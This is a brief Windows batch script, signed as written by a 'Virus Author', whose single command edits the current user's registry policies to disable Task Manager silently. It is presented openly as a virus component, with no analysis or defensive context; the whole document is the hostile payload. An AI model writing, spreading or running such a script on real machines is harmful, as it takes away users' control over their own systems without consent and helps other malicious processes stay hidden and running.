@ echo off

rem ---------------------------------
rem Disable Task Manager
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
rem ---------------------------------


__-Virus Author: subhojit-__